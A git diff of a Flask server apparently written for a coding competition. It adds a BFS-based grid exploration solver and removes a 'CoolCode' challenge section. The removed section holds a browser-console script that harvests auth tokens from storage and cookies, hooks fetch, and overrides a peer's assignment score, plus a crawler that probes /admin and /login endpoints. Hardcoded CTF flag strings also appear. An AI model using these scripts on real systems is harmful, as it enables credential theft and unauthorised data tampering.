@@ -2,9 +2,12 @@ from __future__ import annotations
 from flask import Flask, request, jsonify
 from functools import lru_cache
 from typing import List, Tuple, Optional, Dict, Any
+from collections import deque
 import math
 import re
 import requests
+import numpy as np
+
 
 app = Flask(__name__)
 
@@ -34,278 +37,6 @@ def chase_flags():
         "challenge5": "UBS{16lt0tt13zm1es}"  # UBS{474owrgw8fbyy}
     }
     return jsonify(flags), 201
-
-### coolcode
-@app.route('/update_score', methods=['POST'])
-def update_assignment_score():
-    try:
-        # Get data from request
-        data = request.get_json()
-        
-        if not data:
-            return jsonify({"error": "No JSON data provided"}), 400
-        
-        # Validate required fields
-        required_fields = ["username", "assignmentId", "score"]
-        for field in required_fields:
-            if field not in data:
-                return jsonify({"error": f"Missing required field: {field}"}), 400
-        
-        # Prepare the payload for the CoolCode API
-        payload = {
-            "username": str(data["username"]),
-            "assignmentId": int(data["assignmentId"]),
-            "score": float(data["score"])
-        }
-        
-        # CoolCode API endpoint
-        api_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
-        
-        # Make the POST request to CoolCode API
-        headers = {
-            "Content-Type": "application/json",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Origin": "https://coolcode-hacker-34c5455cd908.herokuapp.com",
-            "Referer": "https://coolcode-hacker-34c5455cd908.herokuapp.com/"
-        }
-        
-        # Add custom headers if provided
-        if "headers" in data:
-            headers.update(data["headers"])
-        
-        response = requests.post(api_url, json=payload, headers=headers, timeout=30)
-        
-        # Return the response from CoolCode API
-        return jsonify({
-            "status": "success",
-            "coolcode_response": {
-                "status_code": response.status_code,
-                "response_text": response.text,
-                "headers": dict(response.headers)
-            },
-            "payload_sent": payload
-        }), 200
-        
-    except requests.exceptions.RequestException as e:
-        return jsonify({
-            "error": "Failed to connect to CoolCode API",
-            "details": str(e)
-        }), 500
-    except ValueError as e:
-        return jsonify({
-            "error": "Invalid data format",
-            "details": str(e)
-        }), 400
-    except Exception as e:
-        return jsonify({
-            "error": "Unexpected error",
-            "details": str(e)
-        }), 500
-
-@app.route('/browser_helper', methods=['GET'])
-def browser_helper():
-    """
-    Provides JavaScript code snippets for browser console use
-    """
-    js_code = """
-// CTF Browser Console Helper Scripts
-console.log("=== CoolCode Score Override Helper ===");
-
-// 1. Basic API call function
-function overrideScore(username, assignmentId, score, authToken = null) {
-    const headers = {
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-        'Accept': 'application/json, text/plain, */*',
-        'X-Requested-With': 'XMLHttpRequest'
-    };
-    
-    // Add auth token if provided
-    if (authToken) {
-        headers['Authorization'] = `Bearer ${authToken}`;
-        // Try common auth header variations
-        headers['X-Auth-Token'] = authToken;
-        headers['X-API-Key'] = authToken;
-    }
-    
-    return fetch('https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score', {
-        method: 'POST',
-        headers: headers,
-        credentials: 'include', // Include cookies
-        body: JSON.stringify({
-            "username": username,
-            "assignmentId": assignmentId,
-            "score": score
-        })
-    })
-    .then(response => {
-        console.log('Response status:', response.status);
-        return response.text();
-    })
-    .then(data => {
-        console.log('Response data:', data);
-        return data;
-    })
-    .catch(error => {
-        console.error('Error:', error);
-        return error;
-    });
-}
-
-// 2. Extract auth tokens from page
-function findAuthTokens() {
-    const tokens = [];
-    
-    // Check localStorage
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        const value = localStorage.getItem(key);
-        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
-            tokens.push({source: 'localStorage', key: key, value: value});
-        }
-    }
-    
-    // Check sessionStorage
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        const value = sessionStorage.getItem(key);
-        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
-            tokens.push({source: 'sessionStorage', key: key, value: value});
-        }
-    }
-    
-    // Check cookies
-    document.cookie.split(';').forEach(cookie => {
-        const [name, value] = cookie.trim().split('=');
-        if (name && (name.toLowerCase().includes('token') || name.toLowerCase().includes('auth') || name.toLowerCase().includes('session'))) {
-            tokens.push({source: 'cookie', key: name, value: value});
-        }
-    });
-    
-    console.log('Found potential auth tokens:', tokens);
-    return tokens;
-}
-
-// 3. Monitor network requests
-function monitorRequests() {
-    const originalFetch = window.fetch;
-    window.fetch = function(...args) {
-        console.log('Fetch intercepted:', args);
-        return originalFetch.apply(this, args).then(response => {
-            console.log('Response received:', response);
-            return response;
-        });
-    };
-    console.log('Request monitoring enabled');
-}
-
-// 4. Quick score override (modify as needed)
-function quickOverride() {
-    const username = prompt("Enter peer's username:");
-    const assignmentId = prompt("Enter assignment ID:");
-    const score = prompt("Enter new score:");
-    
-    if (username && assignmentId && score) {
-        overrideScore(username, parseInt(assignmentId), parseFloat(score));
-    }
-}
-
-// Usage examples:
-console.log("Available functions:");
-console.log("- overrideScore('username', 1, 100)");
-console.log("- findAuthTokens()");
-console.log("- monitorRequests()");
-console.log("- quickOverride()");
-
-// Auto-run token discovery
-findAuthTokens();
-"""
-    
-    return f"""
-    <html>
-    <head><title>CoolCode CTF Helper</title></head>
-    <body>
-        <h1>CoolCode Score Override - CTF Helper</h1>
-        <h2>Browser Console Instructions</h2>
-        <ol>
-            <li>Open Developer Tools (F12)</li>
-            <li>Go to Console tab</li>
-            <li>Copy and paste the following JavaScript code:</li>
-        </ol>
-        <textarea style="width:100%; height:400px; font-family:monospace;">{js_code}</textarea>
-        
-        <h2>Manual Steps</h2>
-        <ol>
-            <li>Navigate to: <a href="https://coolcode-hacker-34c5455cd908.herokuapp.com" target="_blank">CoolCode Website</a></li>
-            <li>Open Network tab in DevTools</li>
-            <li>Look for existing API calls</li>
-            <li>Use the JavaScript functions above to override scores</li>
-        </ol>
-        
-        <h2>API Details</h2>
-        <p><strong>Endpoint:</strong> POST https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score</p>
-        <p><strong>Payload Format:</strong></p>
-        <pre>{{
-    "username": "student_username",
-    "assignmentId": 123,
-    "score": 100
-}}</pre>
-    </body>
-    </html>
-    """, 200, {'Content-Type': 'text/html'}
-
-@app.route('/explore_coolcode', methods=['GET'])
-def explore_coolcode():
-    """
-    Route to explore the CoolCode website and gather information.
-    """
-    try:
-        base_url = "https://coolcode-hacker-34c5455cd908.herokuapp.com"
-        
-        # Try to access different endpoints to explore the site
-        endpoints_to_try = [
-            "/",
-            "/api",
-            "/api/assignment",
-            "/api/students",
-            "/api/assignments",
-            "/login",
-            "/admin",
-            "/dashboard"
-        ]
-        
-        results = {}
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-        }
-        
-        for endpoint in endpoints_to_try:
-            try:
-                url = base_url + endpoint
-                response = requests.get(url, headers=headers, timeout=10)
-                results[endpoint] = {
-                    "status_code": response.status_code,
-                    "content_length": len(response.content),
-                    "headers": dict(response.headers),
-                    "preview": response.text[:500] if response.text else "No content"
-                }
-            except Exception as e:
-                results[endpoint] = {
-                    "error": str(e)
-                }
-        
-        return jsonify({
-            "exploration_results": results,
-            "target_api": "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
-        }), 200
-        
-    except Exception as e:
-        return jsonify({
-            "error": "Failed to explore CoolCode",
-            "details": str(e)
-        }), 500
 
 ####### trading bot
 BULL_TOKENS = {
@@ -923,6 +654,262 @@ def solve():
 
     return jsonify(results), 200
 ###### ink archive end
+
+##### fog of wall bfs?
+
+game_states = {}    # init game state
+
+class GameState:
+    def __init__(self, test_case):
+        self.grid_size = test_case['length_of_grid']
+        self.total_walls = test_case['num_of_walls']
+        self.crows = {crow['id']: {'x': crow['x'], 'y': crow['y'], 'visited': set()} for crow in test_case['crows']}
+        
+        # Initialize the global map
+        self.global_map = {}
+        self.known_walls = set()
+        self.unknown_cells = set()
+        
+        # Initialize all cells as unknown
+        for x in range(self.grid_size):
+            for y in range(self.grid_size):
+                self.unknown_cells.add((x, y))
+        
+        # Mark starting positions as empty
+        for crow_id, crow in self.crows.items():
+            pos = (crow['x'], crow['y'])
+            self.global_map[pos] = '_'
+            if pos in self.unknown_cells:
+                self.unknown_cells.remove(pos)
+            crow['visited'].add(pos)
+        
+        # Strategy variables
+        self.current_crow_index = 0
+        self.crow_ids = list(self.crows.keys())
+        self.exploration_queue = {crow_id: deque() for crow_id in self.crow_ids}
+        self.scan_cooldown = {crow_id: 0 for crow_id in self.crow_ids}
+        
+    def update_from_scan(self, crow_id, scan_result):
+        crow = self.crows[crow_id]
+        center_x, center_y = crow['x'], crow['y']
+        
+        for dx in range(-2, 3):
+            for dy in range(-2, 3):
+                abs_x = center_x + dx
+                abs_y = center_y + dy
+                pos = (abs_x, abs_y)
+                
+                # Check if within bounds
+                if 0 <= abs_x < self.grid_size and 0 <= abs_y < self.grid_size:
+                    cell_value = scan_result[dx + 2][dy + 2]
+                    
+                    if cell_value == 'W':
+                        self.global_map[pos] = 'W'
+                        self.known_walls.add(f"{abs_x}-{abs_y}")
+                        if pos in self.unknown_cells:
+                            self.unknown_cells.remove(pos)
+                    elif cell_value == '_':
+                        self.global_map[pos] = '_'
+                        if pos in self.unknown_cells:
+                            self.unknown_cells.remove(pos)
+                        # Add to exploration queue if not visited by this crow
+                        if pos not in crow['visited']:
+                            self.exploration_queue[crow_id].append(pos)
+                
+    def update_from_move(self, crow_id, new_pos):
+        old_pos = (self.crows[crow_id]['x'], self.crows[crow_id]['y'])
+        self.crows[crow_id]['x'], self.crows[crow_id]['y'] = new_pos
+        self.crows[crow_id]['visited'].add(new_pos)
+        
+        # Mark the new position as empty
+        if new_pos not in self.global_map or self.global_map[new_pos] != '_':
+            self.global_map[new_pos] = '_'
+            if new_pos in self.unknown_cells:
+                self.unknown_cells.remove(new_pos)
+    
+    def get_next_action(self):
+        # Check if we've found all walls
+        if len(self.known_walls) >= self.total_walls:
+            return {
+                'action_type': 'submit',
+                'submission': list(self.known_walls)
+            }
+        
+        # Rotate through crows
+        crow_id = self.crow_ids[self.current_crow_index]
+        self.current_crow_index = (self.current_crow_index + 1) % len(self.crow_ids)
+        
+        crow = self.crows[crow_id]
+        current_pos = (crow['x'], crow['y'])
+        
+        # Check if we should scan (every 5 moves or when cooldown is up)
+        if self.scan_cooldown[crow_id] <= 0 and self.should_scan(crow_id):
+            self.scan_cooldown[crow_id] = 5  # Reset cooldown
+            return {
+                'crow_id': crow_id,
+                'action_type': 'scan'
+            }
+        
+        # Get next move direction
+        direction = self.get_next_move_direction(crow_id)
+        if direction:
+            self.scan_cooldown[crow_id] = max(0, self.scan_cooldown[crow_id] - 1)
+            return {
+                'crow_id': crow_id,
+                'action_type': 'move',
+                'direction': direction
+            }
+        
+        # If no move found, scan instead
+        self.scan_cooldown[crow_id] = 5
+        return {
+            'crow_id': crow_id,
+            'action_type': 'scan'
+        }
+    
+    def should_scan(self, crow_id):
+        # Scan if we haven't scanned this area recently and there are unknown cells nearby
+        crow = self.crows[crow_id]
+        unknown_nearby = 0
+        
+        for dx in range(-2, 3):
+            for dy in range(-2, 3):
+                if dx == 0 and dy == 0:
+                    continue
+                pos = (crow['x'] + dx, crow['y'] + dy)
+                if pos in self.unknown_cells:
+                    unknown_nearby += 1
+        
+        return unknown_nearby > 2  # Scan if more than 2 unknown cells nearby
+    
+    def get_next_move_direction(self, crow_id):
+        crow = self.crows[crow_id]
+        current_pos = (crow['x'], crow['y'])
+        
+        # First, try to explore from the queue
+        while self.exploration_queue[crow_id]:
+            target_pos = self.exploration_queue[crow_id][0]
+            if target_pos in crow['visited']:
+                self.exploration_queue[crow_id].popleft()
+                continue
+            
+            # Find path to target
+            path = self.find_path(current_pos, target_pos, crow_id)
+            if path:
+                next_pos = path[0]
+                return self.get_direction(current_pos, next_pos)
+            else:
+                self.exploration_queue[crow_id].popleft()
+        
+        # If no exploration targets, find the nearest unknown cell
+        nearest_unknown = self.find_nearest_unknown(current_pos)
+        if nearest_unknown:
+            path = self.find_path(current_pos, nearest_unknown, crow_id)
+            if path:
+                next_pos = path[0]
+                return self.get_direction(current_pos, next_pos)
+        
+        return None
+    
+    def find_path(self, start, target, crow_id):
+        """Simple BFS to find path to target, avoiding known walls"""
+        queue = deque([(start, [])])
+        visited = set([start])
+        
+        while queue:
+            (x, y), path = queue.popleft()
+            
+            if (x, y) == target:
+                return path
+            
+            for dx, dy, direction in [(0, 1, 'E'), (1, 0, 'S'), (0, -1, 'W'), (-1, 0, 'N')]:
+                new_x, new_y = x + dx, y + dy
+                new_pos = (new_x, new_y)
+                
+                if (0 <= new_x < self.grid_size and 0 <= new_y < self.grid_size and 
+                    new_pos not in visited and 
+                    self.global_map.get(new_pos, '_') != 'W'):
+                    visited.add(new_pos)
+                    queue.append((new_pos, path + [new_pos]))
+        
+        return None
+    
+    def find_nearest_unknown(self, start_pos):
+        """Find the nearest unknown cell using BFS"""
+        queue = deque([start_pos])
+        visited = set([start_pos])
+        
+        while queue:
+            x, y = queue.popleft()
+            
+            if (x, y) in self.unknown_cells:
+                return (x, y)
+            
+            for dx, dy in [(0, 1), (1, 0), (0, -1), (-1, 0)]:
+                new_x, new_y = x + dx, y + dy
+                new_pos = (new_x, new_y)
+                
+                if (0 <= new_x < self.grid_size and 0 <= new_y < self.grid_size and 
+                    new_pos not in visited and 
+                    self.global_map.get(new_pos, '_') != 'W'):
+                    visited.add(new_pos)
+                    queue.append(new_pos)
+        
+        return None
+    
+    def get_direction(self, current_pos, next_pos):
+        cx, cy = current_pos
+        nx, ny = next_pos
+        
+        if nx == cx:
+            if ny > cy: return 'E'
+            if ny < cy: return 'W'
+        if ny == cy:
+            if nx > cx: return 'S'
+            if nx < cx: return 'N'
+        return None
+
+@app.route('/fog-of-wall', methods=['POST'])
+def fog_of_wall():
+    try:
+        data = request.get_json()
+        challenger_id = data['challenger_id']
+        game_id = data['game_id']
+        
+        # Initialize or update game state
+        if 'test_case' in data:
+            # New test case
+            game_states[game_id] = GameState(data['test_case'])
+            response = game_states[game_id].get_next_action()
+        else:
+            # Update based on previous action
+            prev_action = data['previous_action']
+            game_state = game_states[game_id]
+            
+            if prev_action['your_action'] == 'move':
+                game_state.update_from_move(
+                    prev_action['crow_id'],
+                    tuple(prev_action['move_result'])
+                )
+            elif prev_action['your_action'] == 'scan':
+                game_state.update_from_scan(
+                    prev_action['crow_id'],
+                    prev_action['scan_result']
+                )
+            
+            response = game_state.get_next_action()
+        
+        # Add common fields
+        response['challenger_id'] = challenger_id
+        response['game_id'] = game_id
+        
+        return jsonify(response)
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 400
+
+##### fog of wall end
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)      
